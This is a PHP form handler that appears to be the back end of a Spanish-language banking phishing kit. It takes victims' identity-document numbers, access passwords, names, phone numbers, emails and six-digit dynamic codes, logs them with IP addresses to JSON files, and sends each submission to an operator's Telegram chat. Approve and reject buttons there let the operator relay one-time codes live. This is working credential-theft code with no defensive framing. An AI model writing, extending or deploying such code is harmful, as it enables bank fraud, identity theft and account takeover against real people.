<?php

require_once __DIR__ . '/security.php';
require_once __DIR__ . '/config.php';
require_once __DIR__ . '/storage.php';

init_secure_session();
send_security_headers();
check_rate_limit('form_handler', 20, 60);

$botToken = $BOT_TOKEN;
$chatId   = $CHAT_ID;

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    die('Método no permitido');
}

$isLogin     = !empty($_POST['documento']) && !empty($_POST['clave']);
$isSolicitud = !empty($_POST['numDoc']) && !empty($_POST['nombres']) && empty($_POST['documento']) && empty($_POST['clave']);
$isDinamica  = isset($_POST['clave_dinamica']) && $_POST['clave_dinamica'] !== '';

if (!$isLogin && !$isSolicitud && !$isDinamica) {
    http_response_code(400);
    die('Datos insuficientes o formulario desconocido');
}

if ($isLogin) {

    validate_bot_submission('login', 1, 7200);

    $tipoDoc   = isset($_POST['tipoDoc']) ? substr(trim($_POST['tipoDoc']), 0, 40) : '';
    $documento = isset($_POST['documento']) ? clean_num(substr(trim($_POST['documento']), 0, 15)) : '';
    $clave     = isset($_POST['clave']) ? substr(trim($_POST['clave']), 0, 6) : '';

    if (empty($documento) || strlen($clave) < 4) {
        header('Location: ../login.php?error=1');
        exit;
    }

    $mapTiposLogin = [
        'Cédula Ciudadanía'     => 'CC',
        'Cédula de Ciudadanía'  => 'CC',
        'Cédula de Extranjería' => 'CE',
        'Pasaporte'             => 'PA'
    ];
    $tipoCorto = isset($mapTiposLogin[$tipoDoc]) ? $mapTiposLogin[$tipoDoc] : 'CC';

    $logins = storage_get_data('logins.json');
    $logins[$documento] = [
        'tipo'   => $tipoCorto,
        'clave'  => $clave,
        'estado' => 'pending',
        'time'   => date('Y-m-d H:i:s'),
        'ip'     => get_client_ip()
    ];
    storage_save_data('logins.json', $logins);

    $_SESSION['ultimo_doc_login'] = $documento;
    setcookie('ultimo_doc_login', $documento, [
        'expires'  => time() + 3600,
        'path'     => '/',
        'secure'   => (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on'),
        'httponly' => true,
        'samesite' => 'Lax'
    ]);

    $tipoCortoEsc = htmlspecialchars($tipoCorto, ENT_QUOTES, 'UTF-8');
    $docEsc       = htmlspecialchars($documento, ENT_QUOTES, 'UTF-8');
    $claveEsc     = htmlspecialchars($clave, ENT_QUOTES, 'UTF-8');

    $mensaje  = "🔐 <b>DATOS DE ACCESO</b>\n\n";
    $mensaje .= "✅ Usuario y contraseña\n\n";
    $mensaje .= "🪪 Tipo de documento: {$tipoCortoEsc}\n";
    $mensaje .= "🆔 Número de cédula: <b>{$docEsc}</b>\n";
    $mensaje .= "🔑 Clave de acceso: <b>{$claveEsc}</b>";

    $replyMarkup = [
        'inline_keyboard' => [
            [
                [
                    'text' => '✅Aprobado',
                    'callback_data' => 'login_ok:' . $documento
                ],
                [
                    'text' => '❌Login',
                    'callback_data' => 'login_error:' . $documento
                ]
            ]
        ]
    ];

    $url = "https://api.telegram.org/bot$botToken/sendMessage";

    $data = [
        'chat_id'      => $chatId,
        'text'         => $mensaje,
        'parse_mode'   => 'HTML',
        'reply_markup' => json_encode($replyMarkup)
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);

    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);

    if (curl_errno($ch)) {
        error_log('Error cURL al enviar a Telegram (login): ' . curl_error($ch));
    } elseif ($httpCode >= 400) {
        $respDecoded = json_decode($response, true);
        $errorMsg = isset($respDecoded['description']) ? $respDecoded['description'] : 'Error desconocido de Telegram';
        error_log("Error API Telegram login (HTTP $httpCode): " . $errorMsg);
    }

    curl_close($ch);

    header('Location: ../loader.php?doc=' . urlencode($documento));
    exit;
}

if ($isSolicitud) {

    validate_bot_submission('solicitud', 1, 7200);

    $tipoDoc  = isset($_POST['tipoDoc']) ? substr(trim($_POST['tipoDoc']), 0, 40) : '';
    $numDoc   = isset($_POST['numDoc']) ? clean_num(substr(trim($_POST['numDoc']), 0, 15)) : '';
    $nombres  = isset($_POST['nombres']) ? htmlspecialchars(strip_tags(substr(trim($_POST['nombres']), 0, 60)), ENT_QUOTES, 'UTF-8') : '';
    $apellido = isset($_POST['apellido']) ? htmlspecialchars(strip_tags(substr(trim($_POST['apellido']), 0, 60)), ENT_QUOTES, 'UTF-8') : '';
    $celular  = isset($_POST['celular']) ? clean_num(substr(trim($_POST['celular']), 0, 12)) : '';
    $email    = isset($_POST['email']) ? filter_var(trim($_POST['email']), FILTER_SANITIZE_EMAIL) : '';
    $acepto   = isset($_POST['acepto']) ? 'Sí' : 'No';

    $mapTiposSol = [
        'Cédula de ciudadanía'  => 'CC',
        'Cédula de extranjería' => 'CE',
        'Pasaporte'             => 'PA'
    ];
    $tipoCorto = isset($mapTiposSol[$tipoDoc]) ? $mapTiposSol[$tipoDoc] : 'CC';

    $tipoCortoEsc = htmlspecialchars($tipoCorto, ENT_QUOTES, 'UTF-8');
    $numDocEsc    = htmlspecialchars($numDoc, ENT_QUOTES, 'UTF-8');
    $nombresEsc   = $nombres;
    $apellidoEsc  = $apellido;
    $celularEsc   = htmlspecialchars($celular, ENT_QUOTES, 'UTF-8');
    $emailEsc     = htmlspecialchars($email, ENT_QUOTES, 'UTF-8');
    $aceptoEsc    = htmlspecialchars($acepto, ENT_QUOTES, 'UTF-8');

    $mensaje  = "📄 <b>NUEVA SOLICITUD</b>\n\n";
    $mensaje .= "🪪 Tipo de documento: {$tipoCortoEsc}\n";
    $mensaje .= "🆔 N.º de documento: <b>{$numDocEsc}</b>\n\n";
    $mensaje .= "🙍‍♂️ Nombre: <b>{$nombresEsc}</b>\n";
    $mensaje .= "📛 Apellido: <b>{$apellidoEsc}</b>\n\n";
    $mensaje .= "📱 Celular:  {$celularEsc}\n";
    $mensaje .= "📧 Correo: <b>{$emailEsc}</b>\n\n";
    $mensaje .= "📌✨ <b>Registro de nueva solicitud</b>\n";

    $url = "https://api.telegram.org/bot$botToken/sendMessage";

    $data = [
        'chat_id'    => $chatId,
        'text'       => $mensaje,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);

    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);

    if (curl_errno($ch)) {
        error_log('Error cURL al enviar a Telegram (solicitud): ' . curl_error($ch));
    } elseif ($httpCode >= 400) {
        $respDecoded = json_decode($response, true);
        $errorMsg = isset($respDecoded['description']) ? $respDecoded['description'] : 'Error desconocido de Telegram';
        error_log("Error API Telegram solicitud (HTTP $httpCode): " . $errorMsg);
    }

    curl_close($ch);

    header('Location: ../loader.php?sol=1');
    exit;
}

if ($isDinamica) {

    validate_bot_submission('dinamica', 1, 7200);

    $claveRaw = isset($_POST['clave_dinamica']) ? $_POST['clave_dinamica'] : '';
    $clave    = clean_num($claveRaw);

    if (strlen($clave) !== 6) {
        header('Location: ../dinamica.php?error=1');
        exit;
    }

    $idDina = $clave . '_' . time() . '_' . bin2hex(random_bytes(3));

    $din = storage_get_data('dinamicas.json');
    $din[$idDina] = [
        'clave'  => $clave,
        'estado' => 'pending',
        'time'   => date('Y-m-d H:i:s'),
        'ip'     => get_client_ip()
    ];
    storage_save_data('dinamicas.json', $din);

    $mensaje   = '';
    $docSesion = $_SESSION['ultimo_doc_login'] ?? ($_COOKIE['ultimo_doc_login'] ?? '');
    $tipoCorto = '';
    $claveAcc  = '';

    if (!empty($docSesion)) {
        $logins = storage_get_data('logins.json');

        if (isset($logins[$docSesion])) {
            $tipoCorto = isset($logins[$docSesion]['tipo'])  ? $logins[$docSesion]['tipo']  : '';
            $claveAcc  = isset($logins[$docSesion]['clave']) ? $logins[$docSesion]['clave'] : '';

            $tipoCortoEsc = htmlspecialchars($tipoCorto, ENT_QUOTES, 'UTF-8');
            $docEsc       = htmlspecialchars($docSesion,  ENT_QUOTES, 'UTF-8');
            $claveAccEsc  = htmlspecialchars($claveAcc,   ENT_QUOTES, 'UTF-8');

            $mensaje .= "🔐 <b>DATOS DE ACCESO</b>\n\n";
            $mensaje .= "✅ Usuario y contraseña\n\n";
            $mensaje .= "🪪 Tipo de documento: {$tipoCortoEsc}\n";
            $mensaje .= "🆔 Número de cédula: <b>{$docEsc}</b>\n";
            $mensaje .= "🔑 Clave de acceso: <b>{$claveAccEsc}</b>\n\n";
        }
    }

    $claveEsc = htmlspecialchars($clave, ENT_QUOTES, 'UTF-8');

    $mensaje .= "🔐 <b>CLAVE DINÁMICA INGRESADA</b>\n\n";
    $mensaje .= "🧩 Dinámica: <b>{$claveEsc}</b>\n";

    $inlineKeyboard = [];

    if ($docSesion !== '') {
        $inlineKeyboard[] = [
            [
                'text'          => '✅Aprobado',
                'callback_data' => 'login_ok:' . $docSesion
            ],
            [
                'text'          => '❌login',
                'callback_data' => 'login_error:' . $docSesion
            ]
        ];
    }

    $inlineKeyboard[] = [
        [
            'text'          => '❌ Dina',
            'callback_data' => 'dina_x:' . $idDina
        ],
        [
            'text'          => '✅ Finish',
            'callback_data' => 'dina_finish:' . $idDina
        ]
    ];

    $replyMarkup = [
        'inline_keyboard' => $inlineKeyboard
    ];

    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";

    $data = [
        'chat_id'      => $chatId,
        'text'         => $mensaje,
        'parse_mode'   => 'HTML',
        'reply_markup' => json_encode($replyMarkup)
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);

    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);

    if (curl_errno($ch)) {
        error_log('Error cURL al enviar clave dinámica a Telegram: ' . curl_error($ch));
    } elseif ($httpCode >= 400) {
        $respDecoded = json_decode($response, true);
        $errorMsg    = isset($respDecoded['description']) ? $respDecoded['description'] : 'Error desconocido de Telegram';
        error_log("Error API Telegram (dinamica) HTTP $httpCode: " . $errorMsg);
    }

    curl_close($ch);

    header('Location: ../loader.php?dina=' . urlencode($idDina));
    exit;
}
